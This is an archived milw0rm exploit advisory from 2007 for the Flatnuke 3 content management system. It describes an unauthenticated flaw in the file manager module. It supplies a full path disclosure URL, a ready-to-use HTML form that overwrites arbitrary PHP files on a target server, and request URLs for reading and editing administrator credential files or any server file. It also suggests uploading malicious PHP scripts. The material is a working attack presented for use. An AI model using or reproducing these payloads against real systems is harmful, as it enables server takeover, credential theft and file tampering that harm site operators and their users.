<html><head><title>Flatnuke 3 Remote Command Execution / Privilege Escalation</title></head><pre>---------------------------------------------------------------
 ____            __________         __             ____  __   
/_   | ____     |__\_____  \  _____/  |_          /_   |/  |_ 
 |   |/    \    |  | _(__  &lt;_/ ___\   __\  ______  |   \   __\
 |   |   |  \   |  |/       \  \___|  |   /_____/  |   ||  |  
 |___|___|  /\__|  /______  /\___  &gt;__|            |___||__|  
          \/\______|      \/     \/                         
---------------------------------------------------------------

Http://www.inj3ct-it.org 	     Staff[at]inj3ct-it[dot]org 

---------------------------------------------------------------

Flatnuke 3 Remote Command Execution / Privilege Escalation

---------------------------------------------------------------

#By KiNgOfThEwOrLd

---------------------------------------------------------------
Corrupted Module: File Manager
---------------------------------------------------------------
PoC:

Flatnuke doesn't use any database, so the registred users informations 
are located in a php file like 
/flatnuke3/misc/fndatabase/users/username.php . By the file manager 
module, the administrator, can upload, make, edit or delete some files, 
only while he's logging in. By the way, making a post whit the same 
request of that module, we can replace or edit a file, for example an 
user profile. So, there are a lot of way to exploit this vulnerability, 
we can edit the admin credentials, we can upload a malicious php script, 
and much more... But to exploit this vulnerability, we need to know the 
script path. We can get it generating a full path disclosure. 


---------------------------------------------------------------
Full Path Disclosure Example:

http://[target]/[flatnuke3_path]/index.php?mod=[forum_path]&amp;op=disc&amp;argumentname=[a_casual_char]
---------------------------------------------------------------
File Replace Exploit:

&lt;form method=&quot;post&quot; action=&quot;http://[target]/[flatnuke3_path]/index.php?mod=none_filemanager&amp;amp;op=&quot;&gt;&lt;textarea id=&quot;body&quot; name=&quot;body&quot; cols=&quot;90&quot; rows=&quot;35&quot;&gt;
&lt;/textarea&gt;&lt;br&gt;&lt;input value=&quot;Save&quot; type=&quot;submit&quot;&gt;&lt;input type=&quot;reset&quot;&gt;
&lt;input name=&quot;opmod&quot; value=&quot;save&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;ffile&quot; value=&quot;[file_name].php&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;dir&quot; value=&quot;/[script_path]/[file_path]&quot; type=&quot;hidden&quot;&gt;&lt;input class=&quot;button&quot; onclick=&quot;history.back()&quot; value=&quot;Annulla&quot; type=&quot;button&quot;&gt;&lt;/form&gt;
---------------------------------------------------------------
User Credential View/Edit Exploit:

http://[target]/[flatnuke3_path]/index.php?mod=none_filemanager&amp;dir=/[script_path]/[flatnuke3_path]/misc/fndatabase/users/&amp;ffile=[username].php&amp;opmod=open&amp;op=

Or, for example u can view and edit a file located on the server:

http://[target]/[flatnuke3_path]/index.php?mod=none_filemanager&amp;dir=/[script_path]/&amp;ffile=[file]&amp;opmod=open&amp;op=
---------------------------------------------------------------
Do you wanna another way to exploit this vuln? Use your brain! :P
---------------------------------------------------------------

# milw0rm.com [2007-10-23]</pre></html>